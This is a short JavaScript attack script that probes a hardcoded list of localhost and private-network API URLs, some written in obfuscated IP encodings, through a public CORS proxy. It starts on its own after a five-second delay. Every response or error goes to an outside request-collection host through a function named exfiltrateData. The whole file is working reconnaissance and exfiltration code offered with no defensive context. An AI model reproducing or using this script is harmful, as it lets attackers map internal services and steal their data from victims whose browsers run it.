const ipValues = [
    "http://localhost/api.php",
    "http://localhost:80/api.php",
    "http://localhost:443/api.php",
    "http://127.0.0.1/api.php",
    "http://127.0.0.1:80/api.php",
    "http://127.0.0.1:443/api.php",
    "http://2130706433/api.php",          
    "http://0x7F000001/api.php",          
    "http://0177.0000.0000.0001/api.php",
    "http://0/api.php",
    "http://127.1/api.php",
    "http://10.0.0.0/api.php",
    "http://10.0.0.1/api.php",
    "http://172.16.0.0/api.php",
    "http://172.16.0.1/api.php",
    "http://192.168.1.0/api.php",
    "http://192.168.1.1/api.php"
];

function exfiltrateData(data) {
    fetch("https://ent3dxrn4z3ni.x.pipedream.net/?data=" + encodeURIComponent(data));
}

function fetchInternalAPI() {
    ipValues.forEach(ip => {
        const proxyUrl = `https://cors-anywhere.herokuapp.com/${ip}`;
        fetch(proxyUrl)
            .then(response => response.text())
            .then(data => exfiltrateData(`Success at ${ip}: ${data}`))
            .catch(error => exfiltrateData(`Error at ${ip}: ${error.message}`));
    });
}


setTimeout(fetchInternalAPI, 5000);
